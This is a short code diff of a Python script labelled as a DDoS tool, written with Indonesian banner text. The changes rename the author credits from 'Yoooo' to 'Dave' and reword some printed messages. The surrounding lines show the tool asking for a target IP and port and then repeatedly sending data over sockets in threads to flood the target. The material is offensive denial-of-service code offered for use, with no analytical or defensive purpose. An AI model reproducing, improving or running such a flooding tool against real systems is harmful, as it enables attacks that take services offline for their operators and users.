@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
-#Kagak Usah Rename BY By Tai Anjing 
-#Ddos by Yooooo
+#SEMANGAT SAYANG DDOSNYA
+#Ddos by Dave
 import random
 import socket
 import threading
 import os
 
 os.system("clear")
-print("DDoS Tools By Yoooo [Beta Version]")
-print("Bismilah Tembus")
+print("DDoS Tools By Dave [Beta Version]")
+print("Tembusin ga nih")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
 choice = str(input(" Gas?(y/n): "))
@@ -37,7 +37,7 @@ def run2():
       s.send(data)
       for x in range(times):
         s.send(data)
-      print(i +" Yoooooooo Di Sini!!!")
+      print(i +" Dave Di Sini!!!")
     except:
       s.close()
       print("[*] Down")
